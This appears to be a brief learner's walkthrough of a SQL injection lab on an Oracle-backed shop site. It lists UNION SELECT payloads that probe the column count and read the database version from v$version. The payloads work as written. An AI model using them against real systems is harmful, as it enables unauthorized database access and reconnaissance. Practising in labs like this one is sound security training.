click on Gifts button
add a ' to sitelink --> if you get an error
type +UNION+SELECT+'abc','def'+FROM+dual--+ to sitelink --> if you get an error again 
add BANNER instead of 'abc' +UNION+SELECT+BANNER,'def'+FROM+dual--+ like this --> and
add NULL instead of 'def' +UNION+SELECT+BANNER,NULL+FROM+dual--+ like this --> and
now for finding version type v$version instead of dual +UNION+SELECT+BANNER,NULL+FROM+v$version--+ like this --> it don't gives you any error
bottom of the site you find version and congratulations you completed the lab
